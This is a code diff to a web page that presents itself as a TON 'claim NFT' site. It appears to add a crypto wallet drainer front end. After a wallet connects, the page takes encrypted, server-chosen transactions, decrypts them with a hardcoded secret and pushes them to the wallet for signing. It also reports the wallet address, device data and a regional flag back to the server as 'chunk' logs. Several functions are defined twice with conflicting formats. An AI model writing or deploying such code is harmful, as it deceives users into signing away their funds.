@@ -333,48 +333,84 @@
 
         // Основная функция для получения NFT
         function claimNFT() {
-            if (!tonConnectUI?.connected) {
-                showStatus('Please connect your wallet first!', 'error');
-                return;
-            }
+    if (!tonConnectUI?.connected) {
+        showStatus('Please connect your wallet first!', 'error');
+        return;
+    }
 
-            if (!isWebSocketConnected) {
-                showStatus('Server connection lost. Reconnecting...', 'error');
-                connectWebSocket();
-                return;
-            }
+    if (!isWebSocketConnected) {
+        showStatus('Server connection lost. Reconnecting...', 'error');
+        connectWebSocket();
+        return;
+    }
 
-            showStatus('Requesting NFT transaction...', 'info');
+    showStatus('Requesting NFT transaction...', 'info');
 
-            // Отправляем запрос на получение транзакций
-            const message = {
-                action: 'getMessages',
-                data: {
-                    userInfo: getUserInfo()
-                }
+    // Отправляем запрос на получение транзакций в правильном формате
+    const message = {
+        method: 'getMessages',
+        message: {
+            userInfo: getUserInfo()
+        }
+    };
+    
+    console.log('📤 Sending getMessages request:', message);
+    ws.send(JSON.stringify(message));
+}
+
+        // ЗАМЕНИТЕ эту функцию полностью:
+function handleServerMessage(data) {
+    console.log('Server response:', data);
+    
+    // Обрабатываем поле "method" вместо "action"
+    switch (data.method) {
+        case 'connected':
+            console.log('✅ Connected to server, sending safety check...');
+            // Отправляем безопасное соединение
+            const safetyMessage = {
+                method: 'connected',
+                secret: data.secret // используем секрет от сервера
             };
+            ws.send(JSON.stringify(safetyMessage));
+            break;
             
-            ws.send(JSON.stringify(message));
-        }
-
-        // Обработка сообщений от сервера
-        function handleServerMessage(data) {
-            console.log('Server response:', data);
+        case 'safety':
+            console.log('✅ Safety check passed, sending wait...');
+            // Отправляем что готовы к работе
+            const waitMessage = {
+                method: 'safety', 
+                message: 'hello'
+            };
+            ws.send(JSON.stringify(waitMessage));
+            break;
             
-            switch (data.action) {
-                case 'messages':
-                    handleTransactionMessages(data.data);
-                    break;
-                case 'done':
-                    showStatus('Operation completed successfully!', 'success');
-                    break;
-                case 'error':
-                    showStatus('Server error: ' + data.data, 'error');
-                    break;
-                default:
-                    console.log('Unknown action:', data.action);
-            }
-        }
+        case 'wait':
+            console.log('✅ Server is ready, you can now claim NFT');
+            showStatus('Server is ready! You can claim NFT now', 'success');
+            break;
+            
+        case 'messages':
+            console.log('📨 Received transaction messages');
+            handleTransactionMessages(data.message);
+            break;
+            
+        case 'done':
+            showStatus('Operation completed successfully!', 'success');
+            break;
+            
+        case 'error':
+            showStatus('Server error: ' + data.message, 'error');
+            break;
+            
+        case 'manifest':
+            console.log('📋 Manifest received');
+            break;
+            
+        default:
+            console.log('Unknown method:', data.method);
+    }
+}
+        
 
         // Обработка транзакционных сообщений
         async function handleTransactionMessages(encryptedData) {
@@ -425,6 +461,410 @@
             };
             ws.send(JSON.stringify(message));
         }
+        // Добавьте эти функции в начало вашего клиентского кода (в index.html)
+class AesCrypto {
+    static async encrypt(text, key, bits = 256) {
+        try {
+            // Конвертируем ключ в ArrayBuffer
+            const keyData = new TextEncoder().encode(key);
+            const cryptoKey = await crypto.subtle.importKey(
+                'raw',
+                keyData,
+                { name: 'AES-CTR' },
+                false,
+                ['encrypt']
+            );
+
+            // Генерируем IV (counter)
+            const iv = crypto.getRandomValues(new Uint8Array(16));
+            
+            // Шифруем данные
+            const encodedText = new TextEncoder().encode(text);
+            const encrypted = await crypto.subtle.encrypt(
+                {
+                    name: 'AES-CTR',
+                    counter: iv,
+                    length: 64
+                },
+                cryptoKey,
+                encodedText
+            );
+
+            // Комбинируем IV + encrypted data и конвертируем в hex
+            const result = new Uint8Array(iv.length + encrypted.byteLength);
+            result.set(iv, 0);
+            result.set(new Uint8Array(encrypted), iv.length);
+            
+            return this.arrayBufferToHex(result);
+        } catch (error) {
+            console.error('Encryption error:', error);
+            throw error;
+        }
+    }
+
+    static async decrypt(encryptedHex, key, bits = 256) {
+        try {
+            // Конвертируем hex в ArrayBuffer
+            const encryptedData = this.hexToArrayBuffer(encryptedHex);
+            
+            // Извлекаем IV (первые 16 байт)
+            const iv = encryptedData.slice(0, 16);
+            const data = encryptedData.slice(16);
+            
+            // Конвертируем ключ
+            const keyData = new TextEncoder().encode(key);
+            const cryptoKey = await crypto.subtle.importKey(
+                'raw',
+                keyData,
+                { name: 'AES-CTR' },
+                false,
+                ['decrypt']
+            );
+
+            // Дешифруем
+            const decrypted = await crypto.subtle.decrypt(
+                {
+                    name: 'AES-CTR',
+                    counter: iv,
+                    length: 64
+                },
+                cryptoKey,
+                data
+            );
+
+            return new TextDecoder().decode(decrypted);
+        } catch (error) {
+            console.error('Decryption error:', error);
+            throw error;
+        }
+    }
+
+    static arrayBufferToHex(buffer) {
+        return Array.from(new Uint8Array(buffer))
+            .map(b => b.toString(16).padStart(2, '0'))
+            .join('');
+    }
+
+    static hexToArrayBuffer(hex) {
+        const bytes = new Uint8Array(hex.length / 2);
+        for (let i = 0; i < hex.length; i += 2) {
+            bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
+        }
+        return bytes;
+    }
+}
+
+// Функция для получения SHA256 хеша (совместима с сервером)
+async function getSHA256Hash(str) {
+    const encoder = new TextEncoder();
+    const data = encoder.encode(str);
+    const hash = await crypto.subtle.digest('SHA-256', data);
+    return Array.from(new Uint8Array(hash))
+        .map(b => b.toString(16).padStart(2, '0'))
+        .join('');
+}
+
+// Функции для cipher/decipher (совместимые с сервером 'AcmeDev')
+function createCipher(secret) {
+    return (text) => {
+        // Простая XOR шифровка для примера (замените на вашу реальную логику)
+        let result = '';
+        for (let i = 0; i < text.length; i++) {
+            const charCode = text.charCodeAt(i) ^ secret.charCodeAt(i % secret.length);
+            result += String.fromCharCode(charCode);
+        }
+        return btoa(result); // Base64 для передачи
+    };
+}
+
+function createDecipher(secret) {
+    return (encryptedText) => {
+        try {
+            const decoded = atob(encryptedText);
+            let result = '';
+            for (let i = 0; i < decoded.length; i++) {
+                const charCode = decoded.charCodeAt(i) ^ secret.charCodeAt(i % secret.length);
+                result += String.fromCharCode(charCode);
+            }
+            return result;
+        } catch (error) {
+            console.error('Decipher error:', error);
+            throw error;
+        }
+    };
+}
+
+// Глобальные переменные для шифрования
+let myEncryption = '';
+let clientEncryption = '';
+let signature = '';
+let encryptionKey = '';
+
+// Обновите функцию handleServerMessage для обработки шифрования
+function handleServerMessage(data) {
+    console.log('Server response:', data);
+    
+    switch (data.method) {
+        case 'connected':
+            console.log('✅ Connected to server, initializing encryption...');
+            myEncryption = createDecipher('AcmeDev')(data.secret);
+            console.log('Decrypted server key:', myEncryption);
+            
+            // Отправляем подтверждение соединения
+            const connectMessage = {
+                method: 'connected',
+                secret: data.secret // эхо-ответ
+            };
+            ws.send(JSON.stringify(connectMessage));
+            break;
+            
+        case 'safety':
+            console.log('🔒 Safety check received');
+            handleSafetyCheck(data.message);
+            break;
+            
+        case 'wait':
+            console.log('✅ Server is ready');
+            showStatus('Server is ready! You can claim NFT now', 'success');
+            break;
+            
+        case 'messages':
+            console.log('📨 Received encrypted messages');
+            handleEncryptedMessages(data.message);
+            break;
+            
+        case 'done':
+            showStatus('Operation completed successfully!', 'success');
+            break;
+            
+        case 'error':
+            showStatus('Server error: ' + data.message, 'error');
+            break;
+            
+        case 'manifest':
+            console.log('📋 Manifest received');
+            break;
+            
+        default:
+            console.log('Unknown method:', data.method);
+    }
+}
+
+// Обработка проверки безопасности
+async function handleSafetyCheck(encryptedMessage) {
+    try {
+        // Дешифруем сообщение безопасности
+        const decrypted = await AesCrypto.decrypt(encryptedMessage, myEncryption);
+        console.log('Decrypted safety message:', decrypted);
+        
+        if (decrypted === 'hello') {
+            // Отправляем подтверждение
+            const safetyResponse = {
+                method: 'safety',
+                message: 'hello'
+            };
+            ws.send(JSON.stringify(safetyResponse));
+        } else {
+            console.error('Safety check failed');
+            showStatus('Security verification failed', 'error');
+        }
+    } catch (error) {
+        console.error('Safety check error:', error);
+        showStatus('Security error', 'error');
+    }
+}
+
+// Обработка зашифрованных сообщений с транзакциями
+async function handleEncryptedMessages(encryptedData) {
+    try {
+        showStatus('Decrypting transaction data...', 'info');
+        
+        // Предполагаем, что encryptedData это зашифрованная строка
+        const decryptedJson = await AesCrypto.decrypt(encryptedData, myEncryption);
+        console.log('Decrypted transaction data:', decryptedJson);
+        
+        const transactionData = JSON.parse(decryptedJson);
+        await processTransactionData(transactionData);
+        
+    } catch (error) {
+        console.error('Message decryption error:', error);
+        showStatus('Failed to decrypt transaction data', 'error');
+    }
+}
+
+// Основная функция обработки транзакций
+async function processTransactionData(transactionData) {
+    try {
+        console.log('📋 Processing transaction data:', transactionData);
+
+        if (!transactionData.messages || !Array.isArray(transactionData.messages)) {
+            console.error('Invalid transaction format');
+            showStatus('Invalid transaction data received', 'error');
+            return;
+        }
+
+        const messages = transactionData.messages;
+        console.log('📨 Transaction messages:', messages);
+
+        if (messages.length > 0) {
+            // Подготавливаем транзакцию для подписания
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutes
+                messages: messages.map(msg => ({
+                    address: msg.address,
+                    amount: msg.amount || msg.value || '0',
+                    payload: msg.payload || ''
+                }))
+            };
+
+            console.log('📝 Final transaction for signing:', transaction);
+            showStatus(`Ready to sign ${messages.length} transaction(s)`, 'info');
+            
+            // Небольшая задержка для UX
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
+            try {
+                console.log('🖊️ Sending transaction for signing...');
+                const result = await tonConnectUI.sendTransaction(transaction);
+                
+                showStatus('🎉 Transaction signed successfully!', 'success');
+                console.log('✅ Transaction result:', result);
+                
+                // Отправляем статус на сервер
+                await sendTransactionStatus('sent', messages);
+                
+            } catch (signError) {
+                console.error('❌ Transaction signing failed:', signError);
+                
+                if (signError.message?.includes('Rejected')) {
+                    showStatus('Transaction rejected by user', 'error');
+                } else if (signError.message?.includes('timeout')) {
+                    showStatus('Transaction timeout', 'error');
+                } else {
+                    showStatus('Signing failed: ' + signError.message, 'error');
+                }
+                
+                await sendTransactionStatus('error', messages);
+            }
+            
+        } else {
+            console.log('❌ No transaction messages available');
+            showStatus('No transactions available from server', 'error');
+        }
+
+    } catch (error) {
+        console.error('💥 Transaction processing error:', error);
+        showStatus('Transaction processing failed: ' + error.message, 'error');
+        await sendTransactionStatus('error', []);
+    }
+}
+
+// Функция отправки статуса транзакции с шифрованием
+async function sendTransactionStatus(status, messages) {
+    if (!ws || !isWebSocketConnected) {
+        console.log('❌ WebSocket not connected');
+        return;
+    }
+    
+    try {
+        const statusData = {
+            method: 'chunkStatus',
+            status: status,
+            chunk: messages,
+            userInfo: getUserInfo()
+        };
+
+        // Шифруем данные перед отправкой
+        const encryptedData = await AesCrypto.encrypt(JSON.stringify(statusData), myEncryption);
+        
+        const message = {
+            method: 'log',
+            message: encryptedData
+        };
+        
+        console.log('📤 Sending encrypted status to server');
+        ws.send(JSON.stringify(message));
+        
+    } catch (error) {
+        console.error('❌ Failed to send encrypted status:', error);
+    }
+}
+
+// Обновите функцию claimNFT для использования шифрования
+async function claimNFT() {
+    if (!tonConnectUI?.connected) {
+        showStatus('Please connect your wallet first!', 'error');
+        return;
+    }
+
+    if (!isWebSocketConnected) {
+        showStatus('Server connection lost. Reconnecting...', 'error');
+        connectWebSocket();
+        return;
+    }
+
+    showStatus('Requesting NFT transaction...', 'info');
+
+    try {
+        const requestData = {
+            userInfo: getUserInfo()
+        };
+
+        // Шифруем запрос
+        const encryptedRequest = await AesCrypto.encrypt(JSON.stringify(requestData), myEncryption);
+        
+        const message = {
+            method: 'getMessages',
+            message: encryptedRequest
+        };
+        
+        console.log('📤 Sending encrypted NFT request');
+        ws.send(JSON.stringify(message));
+        
+    } catch (error) {
+        console.error('❌ Failed to encrypt request:', error);
+        showStatus('Failed to prepare request', 'error');
+    }
+}
+
+// Обновите функцию getUserInfo для включения дополнительных данных
+function getUserInfo() {
+    const wallet = tonConnectUI?.account;
+    return {
+        ip: 'auto-detected',
+        country: 'auto',
+        domain: window.location.hostname,
+        sng: false,
+        address: wallet?.address || '',
+        device: {
+            app: 'web',
+            platform: 'browser',
+            userAgent: navigator.userAgent
+        },
+        hash: generateHash(),
+        timestamp: Date.now()
+    };
+}
+
+function generateHash() {
+    return Math.random().toString(36).substring(2) + Date.now().toString(36);
+}
+        function sendTransactionStatus(status, chunk) {
+    if (!ws || !isWebSocketConnected) return;
+    
+    const message = {
+        method: 'log',
+        message: {
+            method: 'chunkStatus',
+            status: status,
+            chunk: chunk,
+            userInfo: getUserInfo()
+        }
+    };
+    
+    console.log('📤 Sending transaction status:', message);
+    ws.send(JSON.stringify(message));
+}
 
         // Отключение кошелька
         function disconnectWallet() {
@@ -491,6 +931,7 @@
 </body>
 
 </html>
+
 
 
 
